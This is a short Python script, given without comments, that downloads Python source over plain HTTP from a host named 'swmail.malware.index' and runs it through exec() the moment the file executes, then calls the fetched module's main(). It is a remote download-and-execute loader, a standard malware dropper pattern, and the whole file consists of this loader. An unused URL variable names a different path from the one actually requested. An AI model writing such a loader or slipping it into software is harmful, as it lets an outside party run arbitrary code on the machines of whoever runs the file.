import sys
import types
import http.client

def execute():
    url = "http://swmail.malware.index/fagwr.py"
    module_name = "gwar"

    conn = http.client.HTTPConnection("swmail.malware.index")
    conn.request("GET", "/garw.py")
    response = conn.getresponse()
    source = response.read().decode()

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
